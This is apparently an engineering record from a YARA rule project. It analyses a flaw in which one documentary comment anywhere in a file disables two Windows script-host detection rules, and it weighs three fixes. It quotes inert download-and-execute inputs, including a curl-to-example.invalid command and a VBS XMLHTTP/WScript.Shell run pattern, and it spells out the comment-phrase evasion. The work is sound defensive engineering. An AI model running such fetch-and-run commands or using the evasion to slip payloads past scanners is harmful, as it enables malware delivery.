# The whole-file documentary exemption of two Windows rules

Date: 2026-11-22. Base: `main` at `bed66d4`. Engine: YARA-X 1.23.0, Python 3.12.3, x86_64
Linux container running as root. Rules: a disposable copy of the shipped `rules/local` (89
rules), no vendor packs. Every run below is a direct run on this container; nothing here is
hosted CI. The scripts are a few inert lines that name `example.invalid`; none was run.

This record changes no rule. It reproduces a lead and sets out a decision. The maintainer
chose option 1 on 2026-11-22: the rules stay as they are and the entry stays open.

## The lead

[#322](https://github.com/cgfixit/yara-gate/issues/322), item 3.
`rules/local/windows_script_host_payload.yar` holds two advisory rules. Each ends its
condition with `not $doc`, where `$doc` is a documentary phrase (`the following`,
`common lure`, `for example`) followed within 160 bytes by a name the rule cares about. A
`not $doc` is true or false for the file, not for a match: one such phrase anywhere turns the
rule off everywhere.

## Reproduced on the base

`scan_bytes`, default policy.

| Input | Name | Result |
| --- | --- | --- |
| `CreateObject("MSXML2.XMLHTTP")`, `.Open`, `CreateObject("WScript.Shell")`, `.Run "a.exe"` | `a.vbs` | advisory, `win_script_host_fetch_run` |
| the same, under `' For example, WScript.Shell is common in admin scripts.` | `a.vbs` | **clean** |
| the same, with `' the following note mentions XMLHTTP` 4 KiB below it | `a.vbs` | **clean** |
| `curl.exe -o a.exe http://example.invalid/a.exe` then `start a.exe` | `a.cmd` | advisory, `win_cmd_fetch_start` |
| the same, under `REM for example curl is a download tool` | `a.cmd` | **clean** |
| the same, with that comment 4 KiB below it | `a.cmd` | **clean** |

The comment does not have to describe the payload, sit near it, or come before it.
`script_download_execute` ties its phrase to a command: it exempts only the command on the
phrase's own line or the line below, and its intent says what that costs.

## What depends on the exemption today

The rule file was compiled twice with YARA-X, as shipped and with `not $doc` removed from
both rules, and each file with a text suffix was scanned as raw bytes with both.

| Files | Shipped rules fire | Exemption removed | Kept clean by the exemption alone |
| --- | --- | --- | --- |
| 61,771 under `/usr/share`, `/usr/lib`, `/opt`, `/etc` | 1 | 1 | 0 |
| 202 in this repository's `docs/`, `rules/`, and `README.md` | 4 | 6 | 2, both `.json` signature data |

This machine holds almost no Windows scripts and no security write-ups, so the first row
says the exemption is rarely reached in ordinary installed text. It does not say how often a
write-up about these lures reaches it. That corpus was not available here.

## The decision

Each option keeps both rule ids and their advisory severity.

1. **Leave the rules as they are and keep this entry open.** Nothing that is admitted today
   is held. The bypass stays: one phrase anywhere clears both rules, and another rule has to
   catch the payload.
2. **Tie the phrase to the command it introduces**: exempt a match only when a `$doc` match
   starts within its own reach before it (about 180 bytes), with a range lookup as the
   paired-string rules use. Because the base exempts on any `$doc` match at all, this can
   only add findings; nothing the base reports can go clean. The cost is a write-up that
   introduces a script and then quotes more than a few lines of it: its later lines are past
   the reach, the rule fires, and under `agent-ingest` and `agent-document` that advisory is
   a hold where the file is admitted today. `win_cmd_fetch_start` would start to read where
   its matches lie, so it needs a match-cap clause and a pass of `probe_match_cap.py`.
3. **Remove the exemption from both rules.** No phrase clears them. Every write-up that
   quotes one of these lures is advisory.

An attacker who writes the phrase directly above the payload still passes under option 2,
as today; under option 3 there is no phrase to write. A text-level exemption cannot tell a
quoted script from a live one; it can only say how near the quotation has to be.

Options 2 and 3 were not built because the choice is between a known bypass and holding
documents that pass today, and that weighing belongs to the maintainer. Either would owe the checks in
the backlog's "What a rule change has to show": new near-misses in `check_rule_pairs.py`,
the installed-file sweep, 4 MiB timing for the new lookups, and the match-cap probe.

## What this does not cover

- Whether another shipped rule catches each payload once these two are cleared. The two
  inputs above come back clean, so for them none does.
- UTF-16 copies and zipped copies of the inputs.
- Vendor packs, which were not installed.
